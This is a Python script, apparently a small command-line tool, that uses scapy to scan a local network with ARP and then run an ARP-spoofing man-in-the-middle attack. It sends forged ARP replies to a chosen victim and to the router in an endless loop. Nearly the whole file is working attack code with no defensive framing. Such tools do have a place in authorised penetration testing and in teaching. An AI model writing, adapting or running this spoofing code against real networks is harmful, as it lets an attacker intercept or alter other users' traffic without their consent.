from scapy.all import *
from scapy.layers.l2 import Ether, ARP, arping
from scapy.layers.inet import IP, TCP,Packet
import time
import requests
import argparse
import sys
def getArguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("--ip1",dest="ip1",help = "ip of target 1")
	parser.add_argument("--ip2",dest = "ip2", help = "ip of target 2")
	parser.add_argument("-d","--discover-network",dest="discover",help = "discover hosts connected to your local network")
	parser.add_argument('--ip-range',dest = "ip_range",help = "ip range of your local network")
	return parser.parse_args()


# check the MAC address of spacific ip 
def checkMACAddress(ip_address):
	arp_packet = Ether() / ARP(pdst = ip_address)

	answer,_ = srp(arp_packet,timeout = 5,verbose = False) # send arp request to device with that ip
	print(f"Checking MAC address for {ip_address}")
	print("=======================================")
	MAC_ADDRESS = ''
	for i in answer.res:
		if i[1].haslayer(Ether):
			MAC_ADDRESS = i[1]['Ether'].src
			print(f'Found {MAC_ADDRESS}')
	return MAC_ADDRESS

# MITM (to become man in the middle)
def arpSpoof(victim_ip,router_ip,victim_MAC,router_MAC):
	# router_MAC = checkMACAddress(router_ip)
	# victim_MAC = checkMACAddress(victim_ip)
	router_arp_request,_ = srp(Ether(dst = router_MAC) / ARP(psrc=victim_ip,pdst = router_ip),timeout = 2,verbose = False)
	victim_arp_request,_ = srp(Ether(dst = victim_MAC) / ARP(psrc=router_ip,pdst = victim_ip), timeout = 2, verbose = False)



# to discover hosts connected in our local network 
def discoverNetwork(ip_range):
	packet = Ether(dst = "ff:ff:ff:ff:ff:ff") / ARP(pdst = ip_range)
	hosts,_ = srp(packet,timeout = 2,verbose=False)
	MAC = ''
	IP = ''
	n_hosts = 0
	print('''[IP]					[MAC Address]''')
	print()

	for host in hosts[1:]:
		if host[1].haslayer(Ether):
			MAC = host[1]['Ether'].src
			if host[1].haslayer(ARP):
				IP = host[1]['ARP'].psrc
				MAC = host[1]['ARP'].hwsrc
			if MAC != '' and IP != '':
				n_hosts+=1
				print(f"[+] {IP}			{MAC}")

	print(f"{n_hosts} hosts found!!!")



def runARPSpoof(ip1,ip2):
	packets_number = 0
	MAC1 = checkMACAddress(ip1)
	MAC2 = checkMACAddress(ip2)
	print('Starting MITM')
	try:
		while True:
			arpSpoof(ip1,ip2,MAC1,MAC2)
			packets_number+=2
			print(f"[*] packets {packets_number} sent..\n")
			time.sleep(2)
	except KeyboardInterrupt:
			sys.exit()		


def main():
	arguments = getArguments()
	print(arguments)
	if arguments.discover != None and arguments.discover == 'true':
		if arguments.ip_range != '':
			discoverNetwork(arguments.ip_range)

		else:
			print('Please type ip range')
	if arguments.ip1 != None and arguments.ip2 != None:
		runARPSpoof(arguments.ip1,arguments.ip2)
		

main()